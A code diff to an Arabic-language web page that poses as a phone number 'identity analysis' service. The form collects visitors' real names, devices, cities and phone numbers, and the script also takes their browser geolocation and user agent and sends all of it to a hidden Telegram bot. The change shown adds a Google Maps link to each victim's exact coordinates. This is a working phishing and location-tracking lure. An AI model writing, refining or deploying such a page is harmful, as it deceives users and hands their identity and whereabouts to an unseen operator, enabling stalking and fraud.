@@ -96,7 +96,7 @@
       <input type="text" id="fullname" placeholder="👤 اسمك الحقيقي" required>
       <input type="text" id="device" placeholder="📱 نوع جهازك الحالي" required>
       <input type="text" id="city" placeholder="🌍 مدينتك" required>
-      <input type="text" id="phone" placeholder="📞 رقم الهاتف للتحليل" required>
+      <input type="text" id="phone" placeholder="📞 رقم الهاتف (مثال: +9639xxxxxxx)" required>
       <button type="submit">🔍 بدء التحليل الآن</button>
     </form>
     <p class="note">⚠️ بعد التحليل سيتم إرسال رسالة من صاحب الرقم القديم عبر واتساب.</p>
@@ -120,8 +120,9 @@
         navigator.geolocation.getCurrentPosition(function(position) {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
+          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-          const message = `🧠 تحليل هوية رقم:\n👤 الاسم: ${name}\n📱 الجهاز: ${device}\n🌍 المدينة: ${city}\n📞 الرقم: ${phone}\n📍 الموقع: ${lat}, ${lon}\n🕒 الوقت: ${time}\n🧭 المتصفح: ${agent}`;
+          const message = `🧠 تحليل هوية رقم:\n👤 الاسم: ${name}\n📱 الجهاز: ${device}\n🌍 المدينة: ${city}\n📞 الرقم: ${phone}\n📍 الموقع: ${lat}, ${lon}\n🗺️ خرائط: ${mapsLink}\n🕒 الوقت: ${time}\n🧭 المتصفح: ${agent}`;
 
           fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
             .then(() => {
